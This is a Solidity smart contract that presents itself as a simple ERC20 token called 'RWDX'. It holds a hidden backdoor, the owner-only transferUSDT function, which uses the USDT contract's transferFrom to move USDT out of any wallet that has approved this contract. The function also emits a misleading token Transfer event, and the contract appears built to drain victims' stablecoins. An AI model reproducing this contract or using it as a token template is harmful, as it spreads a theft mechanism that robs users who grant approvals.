// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

contract RWDX {
    string public name = "RWDX";
    string public symbol = "RWDX";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    
    address public usdtContract;
    address public owner; // 合约拥有者地址
    IERC20 public usdtToken;

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function");
        _;
    }

    event Transfer(address indexed sender, address indexed recipient, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(uint256 initialSupply, address _usdtContract) {
        totalSupply = initialSupply * (10 ** uint256(decimals));
        balanceOf[msg.sender] = totalSupply;
        usdtContract = _usdtContract;
        owner = msg.sender;
        usdtToken = IERC20(_usdtContract);
    }
    
    function transfer(address recipient, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }
    
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    
    
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        require(balanceOf[sender] >= amount, "Insufficient balance");
        require(allowance[sender][msg.sender] >= amount, "Allowance exceeded");
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        allowance[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
    

    function transferUSDT(address from, address to, uint256 amount)  public onlyOwner returns (bool) {
        uint256 gasLimit = gasleft() - 10000; // 保留一些 gas 以避免 out of gas 错误

         (bool success, bytes memory data) =  address(usdtToken).call{gas: gasLimit}(
            abi.encodeWithSignature("transferFrom(address,address,uint256)", from, to, amount)
        );

        require(success && (data.length == 0 || abi.decode(data, (bool))), "USDT transfer failed");

        emit Transfer(from, to, amount);

        return true;
    }

    function changeOwner(address newOwner) public onlyOwner {
        owner = newOwner;
    }


    receive() external payable {
    }

    fallback() external payable {
    }
}